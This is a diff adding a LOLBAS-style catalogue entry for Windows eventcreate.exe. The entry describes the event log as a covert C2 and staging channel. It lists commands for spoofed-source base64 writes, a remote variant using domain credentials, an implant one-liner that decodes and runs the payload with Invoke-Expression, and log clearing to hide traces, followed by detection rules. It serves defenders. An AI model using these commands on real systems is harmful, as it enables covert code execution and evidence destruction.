@@ -1,0 +1,134 @@
+---
+Name: Eventcreate.exe
+Description: >
+  Eventcreate.exe is a native Windows command-line utility for creating
+  custom entries in the Windows Event Log. It can be abused as a covert
+  data staging and C2 instruction channel by embedding base64-encoded
+  payloads in the event description field (/D). A resident implant polls
+  the log via Get-WinEvent or ReadEventLog() to retrieve and decode
+  instructions. The write side requires no files dropped, no network
+  connections, and runs at user privilege. Unregistered source names cause
+  Windows Event Viewer to render a misleading "description not found"
+  message, obscuring the payload from casual log inspection while the raw
+  data remains fully recoverable via Get-WinEvent.
+
+Author: Nguyen Khanh Son, Barbara Carminati, Elena Ferrari
+Created: 2026-05-30
+
+Commands:
+  - Command: eventcreate.exe /L Application /SO "svc-health" /ID 420 /T INFORMATION /D "aGVsbG8gd29ybGQ="
+    Description: >
+      Write a base64-encoded payload into the Application Event Log under
+      a spoofed source name. /ID is mandatory (valid range 1-1000).
+      A resident implant polls the log via Get-WinEvent filtering on
+      ProviderName and EventID to retrieve and decode instructions.
+      No files dropped, no network connections from the implant during
+      C2 operation.
+    Usecase: Covert payload staging and C2 channel via Windows Event Log
+    Category: Execute
+    Privileges: User
+    MitreID: T1027
+    OperatingSystem: Windows 10, Windows 11
+    Tags:
+      - Execute: EventLog
+      - Stage: Base64
+
+  - Command: eventcreate.exe /S <target> /U <domain\user> /P <password> /L Application /SO "svc-health" /ID 420 /T INFORMATION /D "aGVsbG8gd29ybGQ="
+    Description: >
+      Write encoded payload to a remote system Event Log without dropping
+      any files on the remote host. Requires domain user credentials with
+      write access to the remote Application log. Enables attacker-controlled
+      instruction staging on remote systems without lateral tool transfer.
+    Usecase: Remote covert payload staging without lateral file transfer
+    Category: Execute
+    Privileges: Domain User
+    MitreID: T1021
+    OperatingSystem: Windows 10, Windows 11
+    Tags:
+      - Execute: Remote
+      - Stage: Base64
+
+  - Command: Invoke-Expression ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((Get-WinEvent -FilterHashtable @{LogName="Application";ProviderName="svc-health";Id=420} -MaxEvents 1).Message)))
+    Description: >
+      Implant-side retrieval and execution. Polls Application log for entries
+      from the attacker-controlled source name and Event ID, decodes the
+      base64 payload from the Message field, and executes it via
+      Invoke-Expression. No network connection required — instruction channel
+      is the local Event Log.
+    Usecase: Execute staged payload retrieved from Event Log C2 channel
+    Category: Execute
+    Privileges: User
+    MitreID: T1059.001
+    OperatingSystem: Windows 10, Windows 11
+    Tags:
+      - Execute: PowerShell
+      - Stage: EventLog
+
+  - Command: Clear-EventLog -LogName Application
+    Description: >
+      Remove all Application log entries after payload retrieval to eliminate
+      forensic evidence of the staged payload. Requires user-level access to
+      the Application log.
+    Usecase: Cleanup staged payload entries from Event Log
+    Category: Execute
+    Privileges: User
+    MitreID: T1070.001
+    OperatingSystem: Windows 10, Windows 11
+    Tags:
+      - Execute: Cleanup
+
+Full_Path:
+  - Path: C:\Windows\System32\eventcreate.exe
+  - Path: C:\Windows\SysWOW64\eventcreate.exe
+
+Detection:
+  - IOC: eventcreate.exe spawning with /D argument containing base64 pattern
+    Type: Sigma
+    Description: >
+      Monitor for eventcreate.exe process creation where CommandLine contains
+      /D with base64-encoded strings (high entropy, padding characters =).
+      Sysmon Event ID 1 (ProcessCreate) with Image=eventcreate.exe and
+      CommandLine matching regex: /D\s+"[A-Za-z0-9+/]{20,}={0,2}".
+      Also alert on source names not in an approved baseline list.
+
+  - IOC: Windows Application Event Log entry from unknown or unregistered source
+    Type: EventLog
+    Description: >
+      Alert on Application log entries where the Source name does not appear
+      in a known-good approved source baseline. Unregistered sources generate
+      a "description not found" rendering error in Event Viewer — this
+      combination (unknown source + rendering error) is a high-fidelity
+      indicator. Windows Event ID 1 in Application log from unlisted source.
+
+  - IOC: PowerShell executing Get-WinEvent followed by Invoke-Expression in same pipeline
+    Type: Behavior
+    Description: >
+      Monitor for PowerShell Script Block Logging (Event ID 4104) containing
+      both Get-WinEvent and Invoke-Expression or [Convert]::FromBase64String
+      in the same script block. This pattern indicates Event Log polling
+      combined with dynamic code execution — a strong behavioral indicator
+      of the implant-side C2 retrieval pattern.
+
+  - IOC: eventcreate.exe /S targeting remote systems
+    Type: Network
+    Description: >
+      Monitor for eventcreate.exe process creation with /S argument indicating
+      remote Event Log writes. Sysmon EID 1 with CommandLine containing /S
+      followed by a hostname or IP. Legitimate administrative use is rare
+      and should be baselined. Remote writes from non-admin workstations
+      are highly suspicious.
+
+Resources:
+  - Link: https://attack.mitre.org/techniques/T1027/
+  - Link: https://attack.mitre.org/techniques/T1021/
+  - Link: https://attack.mitre.org/techniques/T1070/001/
+  - Link: https://lolbas-project.github.io
+  - Link: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/eventcreate
+
+Acknowledgement:
+  - Person: Nguyen Khanh Son
+    Handle: ""
+  - Person: Barbara Carminati
+    Handle: ""
+  - Person: Elena Ferrari
+    Handle: ""
